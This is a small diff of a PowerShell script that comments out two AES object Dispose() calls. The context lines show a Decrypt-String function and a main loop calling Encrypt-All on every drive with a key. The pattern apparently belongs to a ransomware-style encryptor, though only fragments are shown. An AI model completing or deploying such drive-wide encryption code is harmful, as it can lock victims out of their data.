@@ -48,7 +48,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
     $aesManaged = Create-AesManagedObject $key $IV
     $decryptor = $aesManaged.CreateDecryptor();
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
-    $aesManaged.Dispose()
+    #$aesManaged.Dispose()
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
 
@@ -200,5 +200,5 @@ function main{
     foreach ($drive in $drives){
         Encrypt-All $key $drive $aesManaged $encryptor
     }
-    $aesManaged.Dispose()
+    #$aesManaged.Dispose()
 }
